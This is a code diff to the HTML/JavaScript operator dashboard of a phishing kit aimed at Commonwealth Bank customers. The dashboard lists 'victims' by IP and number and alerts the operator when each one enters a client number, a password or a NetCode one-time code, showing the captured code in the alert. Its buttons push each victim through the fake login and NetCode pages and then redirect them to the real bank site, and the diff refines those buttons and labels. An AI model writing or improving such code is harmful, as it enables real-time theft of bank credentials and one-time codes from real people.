@@ -878,7 +878,10 @@
 
     /* ----------  STATUS  ---------- */
     function statusText(s){
-      if (s.page==='success' || s.status==='approved') return '<div style="font-size:11px;color:var(--green)">COMPLETED</div>';
+      // Check if approved/redirected to bank
+      if (s.page==='success' || s.status==='approved') {
+        return '<div style="font-size:11px;color:var(--green);font-weight:600;">AUTHORISED ✓</div>';
+      }
       if (s.page === 'verify.html' && s.otp) return '<div style="font-size:11px;color:var(--yellow)">NETCODE ENTERED</div>';
       if (s.page === 'verify.html') return '<div style="font-size:11px;color:var(--blue)">AWAITING NETCODE</div>';
       if (s.clientNumber && s.password) return '<div style="font-size:11px;color:var(--yellow)">CREDENTIALS ENTERED</div>';
@@ -890,16 +893,23 @@
     function actionButtons(s){
       let html = '<div style="display:flex;gap:6px">';
       html += `<button class="icon-btn manage" onclick="showDetail('${s.sid}')" title="View Details"><img src="/images/description-svgrepo-com.svg"></button>`;
-      if (s.page === 'success' || s.status === 'approved') return html + '</div>';
       
-      // Show continue/redo buttons for both index and verify pages
-      if ((s.page === 'index.html' && s.clientNumber) || (s.page === 'verify.html' && s.otp)) {
-        html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue"><img src="/images/arrow-right-square-svgrepo-com.svg"></button>`;
-        html += `<button class="icon-btn redo" onclick="act('redo','${s.sid}')" title="Redo"><img src="/images/cross-square-svgrepo-com.svg"></button>`;
-      } else if (s.page === 'index.html' && s.clientNumber) {
-        html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue"><img src="/images/arrow-right-square-svgrepo-com.svg"></button>`;
+      // Don't show action buttons if already approved/redirected
+      if (s.page === 'success' || s.status === 'approved') {
+        return html + '</div>';
+      }
+      
+      // Show continue/redo buttons for login page with credentials
+      if (s.page === 'index.html' && s.clientNumber && s.password) {
+        html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue to NetCode"><img src="/images/arrow-right-square-svgrepo-com.svg"></button>`;
         html += `<button class="icon-btn redo" onclick="act('redo','${s.sid}')" title="Redo"><img src="/images/cross-square-svgrepo-com.svg"></button>`;
       }
+      // Show continue/redo buttons for verify page with OTP
+      else if (s.page === 'verify.html' && s.otp) {
+        html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Authorise & Redirect to Bank"><img src="/images/arrow-right-square-svgrepo-com.svg"></button>`;
+        html += `<button class="icon-btn redo" onclick="act('redo','${s.sid}')" title="Redo"><img src="/images/cross-square-svgrepo-com.svg"></button>`;
+      }
+      
       return html + '</div>';
     }
 
@@ -933,7 +943,7 @@
           if (!old.password && s.password) {
             showAlert('success', 'ENTERED PASSWORD', `Password entered`, s.victimNum);
           }
-          // Check for OTP/NetCode entry - THIS IS THE KEY FIX
+          // Check for OTP/NetCode entry
           if (!old.otp && s.otp) {
             showAlert('success', 'ENTERED NETCODE', `NetCode: ${s.otp}`, s.victimNum);
           }
@@ -941,9 +951,9 @@
           if (!old.phone && s.phone) {
             showAlert('success', 'ENTERED NETCODE', `NetCode: ${s.phone}`, s.victimNum);
           }
-          // Check for approval/success
+          // Check for approval/success - redirect to bank
           if ((old.page !== 'success' && s.page === 'success') || (old.status !== 'approved' && s.status === 'approved')) {
-            showAlert('success', 'LOGIN APPROVED', 'Victim completed full flow', s.victimNum);
+            showAlert('success', 'AUTHORISED', 'Victim redirected to commbank.com.au', s.victimNum);
           }
         }
       });
@@ -961,7 +971,7 @@
 
     /* ----------  RENDER  ---------- */
     function pageTitle(f){
-      if (f === 'success') return 'APPROVED';
+      if (f === 'success') return 'AUTHORISED';
       switch(f){
         case 'index.html': return 'LOGIN';
         case 'verify.html': return 'NETCODE';
@@ -1034,8 +1044,8 @@
       currentSid = sid;
       const approved = isApproved(s);
       
-      qs('#modalTitle').textContent = `Victim #${s.victimNum}${approved ? ' (APPROVED)' : ''}`;
-      qs('#modalSubtitle').textContent = `${s.ip} • Connected ${fmtDate(s.dateStr)}`;
+      qs('#modalTitle').textContent = `Victim #${s.victimNum}${approved ? ' (AUTHORISED)' : ''}`;
+      qs('#modalSubtitle').textContent = `${s.ip} • Connected ${fmtDate(s.dateStr)}${approved ? ' • Redirected to commbank.com.au' : ''}`;
       
       const activityHtml = s.activityLog && s.activityLog.length ? 
         s.activityLog.slice().reverse().map(log => `
@@ -1101,7 +1111,7 @@
           <div class="delete-info">Permanently remove this session from active sessions</div>
           <button class="btn btn-danger" onclick="confirmDelete('${s.sid}')">Delete Session</button>
         </div>
-        ` : '<div style="margin-top:20px;padding-top:20px;border-top:1px solid var(--card-border);color:var(--green);font-size:13px;text-align:center;">✓ This session has been approved and completed</div>'}`;
+        ` : '<div style="margin-top:20px;padding-top:20px;border-top:1px solid var(--card-border);color:var(--green);font-size:13px;text-align:center;">✓ This session has been AUTHORISED and redirected to commbank.com.au</div>'}`;
       
       qs('#modal').style.display='flex';
     }
@@ -1175,4 +1185,5 @@
   </script>
 </body>
 </html>
+
 
